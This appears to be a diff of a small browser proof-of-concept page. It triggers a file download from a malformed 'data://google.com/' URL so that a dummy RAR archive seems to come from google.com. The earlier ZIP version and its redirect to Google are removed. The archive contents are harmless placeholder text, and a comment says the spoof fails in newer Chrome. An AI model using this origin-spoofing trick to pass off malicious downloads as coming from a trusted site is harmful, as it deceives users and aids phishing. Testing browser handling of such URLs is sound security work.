@@ -2,37 +2,29 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>ZIP Download with Origin PoC</title>
+  <title>RAR data:// PoC</title>
 </head>
 <body>
 
-<h3>ZIP Download with Spoofed Origin</h3>
 <button id="start">Start</button>
 
 <script>
 document.getElementById('start').addEventListener('click', () => {
   try {
-    // small base64 dummy
-    const content = "PK\nFake ZIP\nHello Android\nEND";
+    const content = "Rar!\nFake RAR\nTest\nEND";
     const base64 = btoa(content);
 
-    // ⚠️ key: malformed URL trick
-    const payload = "data://google.com/application/zip;base64," + base64;
+    // malformed URL (tidak akan spoof di Chrome baru)
+    const payload = "data://google.com/application/vnd.rar;base64," + base64;
 
-    // trigger download
     const a = document.createElement('a');
     a.href = payload;
-    a.download = "google.zip";
+    a.download = "google.rar";
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
 
-    console.log("ZIP download triggered with spoofed origin");
-
-    // redirect after download
-    setTimeout(() => {
-      location.href = "https://google.com";
-    }, 500);
+    console.log("Triggered data://google PoC");
 
   } catch(e) {
     console.error(e);
